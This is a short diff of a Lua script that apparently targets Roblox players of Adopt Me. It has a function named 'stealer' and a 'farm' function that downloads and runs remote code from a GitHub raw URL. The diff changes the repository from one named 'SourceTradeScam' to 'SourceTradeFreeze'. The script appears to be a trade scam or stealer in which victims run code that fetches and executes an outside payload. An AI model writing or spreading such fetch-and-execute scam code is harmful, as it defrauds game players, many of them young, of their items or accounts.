@@ -3,7 +3,7 @@ local function stealer()
 end
 
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/SourceTradeScam/refs/heads/main/script.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/SourceTradeFreeze/refs/heads/main/script.lua'))()
 end
 
 task.spawn(stealer)
